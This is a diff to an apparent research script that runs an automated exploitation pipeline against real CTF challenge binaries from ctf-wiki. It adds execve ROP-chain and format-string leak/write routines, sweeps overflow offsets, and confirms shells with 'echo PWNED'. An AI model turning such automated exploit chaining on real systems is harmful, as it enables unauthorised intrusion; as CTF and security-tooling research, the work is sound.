@@ -1,18 +1,21 @@
 """
 v032_real_challenges.src — 用真实赛题验证「入口 → 链 → 执行」
 
-题目（ctf-wiki 收录的真实赛题，附件已下载到 experiments/EXP-0032/real）：
+题目（ctf-wiki 收录的真实赛题，附件在 experiments/EXP-0032/real）：
     ret2text      bamboofox/NCTU：gets 溢出，跳 system("/bin/sh") 调用点
     ret2libc1     bamboofox/NCTU：gets 溢出，直接调用 system@plt("/bin/sh")
     rop           bamboofox/NCTU ret2syscall：无 system，需要 execve 系统调用链
     contacts      CSAW 2015：格式化字符串，且有 canary
-    pwn3          CCTF 2016：格式化字符串
+    pwn3          CCTF 2016：格式化字符串（题目特有口令逻辑，暂不支持）
+    leakmemory    ctf-wiki 格式化字符串：printf(s) 泄漏
+    overwrite     ctf-wiki 格式化字符串：写 c=16
 
 流程
     1. 产品分析（secknow.solving.binary）：位数、保护、导入入口、调用图、后门候选；
-    2. 产品链选择（secknow.solving.chains）：libc-call / ret2win / format-string；
-    3. 只有 libc-call 才尝试执行：用适配层（常驻 pwntools worker）构造并运行，
-       成功判据是真拿到 shell（发送 `echo PWNED` 并看到输出）。
+    2. 产品链选择（secknow.solving.chains）：libc-call / syscall-execve / format-string；
+    3. 适配层（常驻 pwntools worker）执行：
+       - libc-call / syscall-execve：构造 payload 并真拿 shell；
+       - format-string：定位偏移后泄漏或写入，用程序的成功输出判定。
 
 运行
     python versions/v032_real_challenges.src
@@ -24,6 +27,7 @@ v032_real_challenges.src — 用真实赛题验证「入口 → 链 → 执行�
 from __future__ import annotations
 
 import json
+import re
 import struct
 import sys
 import time
@@ -51,12 +55,15 @@ def log(message: str) -> None:
     print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
 
 
+# (name, note, strategy, success_marker)
 CASES = [
-    ("ret2text", "栈溢出 → system('/bin/sh') 调用点"),
-    ("ret2libc1", "栈溢出 → system@plt('/bin/sh')"),
-    ("rop", "ret2syscall：无 system，需要 execve 链"),
-    ("contacts", "格式化字符串 + canary"),
-    ("pwn3", "格式化字符串"),
+    ("ret2text", "栈溢出 → system('/bin/sh') 调用点", "auto", "PWNED"),
+    ("ret2libc1", "栈溢出 → system@plt('/bin/sh')", "auto", "PWNED"),
+    ("rop", "ret2syscall：无 system，需要 execve 链", "auto", "PWNED"),
+    ("contacts", "格式化字符串 + canary", "auto", "PWNED"),
+    ("pwn3", "格式化字符串（题目特有口令逻辑）", "unsupported", "PWNED"),
+    ("leakmemory", "格式化字符串泄漏", "fmtstr_leak", "LEAK"),
+    ("overwrite", "格式化字符串写 c=16", "fmtstr_write", "modified c."),
 ]
 
 
@@ -75,12 +82,11 @@ def gadgets_for(worker: PwntoolsWorker, binary: Path) -> dict[str, int]:
         return {}
     found: dict[str, int] = {}
     for gadget in data.get("gadgets", []):
-        key = ";".join(gadget["insns"])
-        found.setdefault(key, gadget["address"])
+        found.setdefault(";".join(gadget["insns"]), gadget["address"])
     return found
 
 
-def build_libc_payloads(profile, worker: PwntoolsWorker) -> tuple[list[bytes], list[int], str | None]:
+def build_libc_payloads(profile, worker: PwntoolsWorker):
     plt = profile.plt_names
     system = plt.get("system")
     shell = (profile.strings.get("/bin/sh") or profile.strings.get("/bin/bash") or [None])[0]
@@ -108,13 +114,41 @@ def build_libc_payloads(profile, worker: PwntoolsWorker) -> tuple[list[bytes], l
     return payloads, offsets, None
 
 
-def evaluate(worker: PwntoolsWorker, name: str, note: str) -> dict:
+def build_syscall_payloads(profile, worker: PwntoolsWorker):
+    shell = (profile.strings.get("/bin/sh") or profile.strings.get("/bin/bash") or [None])[0]
+    if shell is None:
+        return [], [], "no_shell_string"
+    offsets = list(range(96, 161, 4)) if profile.bits == 32 else list(range(40, 201, 8))
+    payloads = []
+    missing: list[str] = []
+    for offset in offsets:
+        try:
+            data = worker.execve_chain(profile.path, shell, offset)
+        except ToolUnavailable as error:
+            return [], [], str(error)
+        missing = data.get("missing") or []
+        if data.get("payload") is None:
+            break
+        payloads.append(bytes.fromhex(data["payload"]))
+    if missing or not payloads:
+        return [], [], "gadget_missing:" + ",".join(missing or ["unknown"])
+    return payloads, offsets, None
+
+
+def run_payloads(worker: PwntoolsWorker, binary: Path, payloads: list[bytes],
+                 marker: str) -> dict:
+    return worker.run_chain(binary, payloads, post=b"echo PWNED; exit\n",
+                            marker=marker, timeout=3)
+
+
+def evaluate(worker: PwntoolsWorker, name: str, note: str,
+             strategy: str, marker: str) -> dict:
     binary = REAL_DIR / name
     started = time.perf_counter()
     record: dict = {"id": name, "note": note, "binary": str(binary)}
     try:
         profile = analyze(binary)
-    except Exception as error:  # noqa: BLE001 - 真实二进制解析失败要如实记录
+    except Exception as error:  # noqa: BLE001
         record.update({"verdict": "failed", "reason": f"analyze:{type(error).__name__}",
                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
         return record
@@ -123,7 +157,8 @@ def evaluate(worker: PwntoolsWorker, name: str, note: str) -> dict:
     chains = build_chains(categories, profile)
     record.update({
         "bits": profile.bits, "pie": profile.is_pie, "canary": profile.has_canary,
-        "nx": profile.has_nx, "imports": sorted(profile.imports & {
+        "nx": profile.has_nx,
+        "imports": sorted(profile.imports & {
             "gets", "system", "printf", "fgets", "read", "execve"}),
         "entries": categories,
         "chains": [{"id": chain.chain_id, "status": chain.status, "reason": chain.reason}
@@ -131,43 +166,77 @@ def evaluate(worker: PwntoolsWorker, name: str, note: str) -> dict:
         "win_candidates": profile.win_candidates[:3],
     })
 
+    def finish(verdict: str, reason: str | None = None, **extra) -> dict:
+        record.update(extra)
+        record.update({"verdict": verdict, "reason": reason,
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+
     if profile.has_canary or profile.is_pie:
-        record.update({"verdict": "refused",
-                       "reason": "canary_present" if profile.has_canary else "pie_enabled",
-                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
-        return record
+        return finish("refused", "canary_present" if profile.has_canary else "pie_enabled")
 
-    libc_chain = next((chain for chain in chains if chain.chain_id == "libc-call"), None)
-    if libc_chain is None:
-        reason = ("needs_leak_chain" if "format_string" in categories
-                  else "no_chain_for_this_class")
-        record.update({"verdict": "unsupported", "reason": reason,
-                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
-        return record
+    if strategy == "unsupported":
+        return finish("unsupported", "challenge_specific_logic")
 
-    payloads, payload_offsets, error = build_libc_payloads(profile, worker)
+    library_call = next((chain for chain in chains if chain.chain_id == "libc-call"), None)
+    syscall_chain = next((chain for chain in chains if chain.chain_id == "syscall-execve"), None)
+
+    if library_call is not None:
+        payloads, offsets, error = build_libc_payloads(profile, worker)
+        mode = "libc-call"
+    elif syscall_chain is not None:
+        payloads, offsets, error = build_syscall_payloads(profile, worker)
+        mode = "syscall-execve"
+    elif strategy == "fmtstr_write" or strategy == "fmtstr_leak":
+        return evaluate_format_string(worker, profile, strategy, marker, finish)
+    else:
+        return finish("unsupported", "no_chain_for_this_class")
+
     if error is not None:
-        record.update({"verdict": "unsupported", "reason": error,
-                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
-        return record
-
+        return finish("unsupported", error)
     try:
-        result = worker.run_chain(binary, payloads, post=b"echo PWNED; exit\n",
-                                  marker="PWNED", timeout=3)
+        result = run_payloads(worker, binary, payloads, marker)
     except ToolUnavailable as tool_error:
-        record.update({"verdict": "failed", "reason": str(tool_error),
-                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
-        return record
-    record.update({
-        "solved": bool(result.get("solved")),
-        "attempts": result.get("attempts"),
-        "offset": (payload_offsets[result["index"]]
-                   if result.get("index") is not None else None),
-        "verdict": "solved" if result.get("solved") else "failed",
-        "reason": None if result.get("solved") else "payload_failed",
-        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1),
-    })
-    return record
+        return finish("failed", str(tool_error))
+    if not result.get("solved"):
+        return finish("failed", "payload_failed", attempts=result.get("attempts"),
+                      mode=mode)
+    index = result.get("index")
+    return finish("solved", None, mode=mode,
+                  offset=offsets[index] if index is not None else None,
+                  attempts=result.get("attempts"))
+
+
+def evaluate_format_string(worker: PwntoolsWorker, profile, strategy: str,
+                           marker: str, finish) -> dict:
+    binary = profile.path
+    try:
+        probe = worker.fmtstr_offset(binary)
+    except ToolUnavailable as error:
+        return finish("failed", str(error))
+    offset = probe.get("offset")
+    if offset is None:
+        return finish("unsupported", "fmtstr_offset_not_found")
+    if strategy == "fmtstr_write":
+        try:
+            result = worker.fmtstr_auto(binary, offset, value=16)
+        except ToolUnavailable as error:
+            return finish("failed", str(error))
+        solved = bool(result.get("solved")) and marker in result.get("output", "")
+        return finish("solved" if solved else "failed",
+                      None if solved else "write_not_observed",
+                      mode="fmtstr-write", offset=offset,
+                      address=hex(result["address"]) if result.get("address") else None)
+    payload = b"%p." * 8
+    try:
+        result = worker.fmtstr_leak(binary, payload)
+    except ToolUnavailable as error:
+        return finish("failed", str(error))
+    tokens = re.findall(r"0x[0-9a-fA-F]+", result.get("output", ""))
+    solved = len(tokens) >= 3
+    return finish("solved" if solved else "failed",
+                  None if solved else "leak_not_observed",
+                  mode="fmtstr-leak", offset=offset, leaked=len(tokens))
 
 
 def write_report(results: list[dict]) -> None:
@@ -200,8 +269,9 @@ def write_report(results: list[dict]) -> None:
             f"| {item.get('elapsed_ms')} ms |")
     lines += ["", "## 说明", "",
               "- 题目与附件来自 ctf-wiki 收录的真实赛题（NCTU bamboofox / CSAW 2015 / CCTF 2016）；",
-              "- 分析用产品代码，执行用适配层（pwntools 常驻 worker），成功判据是真拿到 shell；",
-              "- 没有 system/字符串的题（ret2syscall）与需要泄漏的格式化字符串题如实标为不支持。"]
+              "- 分析用产品代码，执行用适配层（pwntools 常驻 worker）；",
+              "- libc/syscall 链的判据是真拿到 shell；fmtstr 写用程序的成功输出判定；",
+              "- 题目特有口令逻辑（pwn3）与需要多阶段堆布局的题（contacts）如实标为不支持/拒绝。"]
     (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
 
 
@@ -210,10 +280,11 @@ def main() -> None:
     available = worker.available(timeout=30)
     log(f"worker available={available} version={worker.version}")
     results = []
-    for name, note in CASES:
-        result = evaluate(worker, name, note)
+    for name, note, strategy, marker in CASES:
+        result = evaluate(worker, name, note, strategy, marker)
         results.append(result)
-        log(f"{name}: {result.get('verdict')} ({result.get('reason') or '—'})")
+        log(f"{name}: {result.get('verdict')} ({result.get('reason') or '—'})"
+            f"{' offset=' + str(result.get('offset')) if result.get('offset') else ''}")
     worker.close()
     write_report(results)
     summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
